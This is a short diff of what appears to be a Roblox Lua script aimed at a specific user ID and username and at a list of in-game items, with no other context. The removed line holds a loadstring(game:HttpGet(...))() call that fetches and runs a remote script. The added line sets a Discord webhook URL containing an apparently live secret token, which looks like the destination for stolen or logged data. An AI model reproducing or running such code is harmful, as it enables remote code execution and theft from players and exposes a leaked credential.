@@ -1,6 +1,6 @@
 local TARGET_ID = 9675030230
 local TARGET_USER = "awaer5yyy4"
-local WEBHOOK_URL = "loadstring(game:HttpGet("https://raw.githubusercontent.com/script-Ez/Scripts/main/PRINTED_DUEL.lua"))()"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1571529060046344423/3thNGGWVYCZeMcnDhmHkGczINPOd616v6TTRHbOaWWMvMf3c-oJ9XDtV9Ye5xs-gO8xq"
 
 local TargetBrainrots = {
     ["Hydra Bunny"] = true,
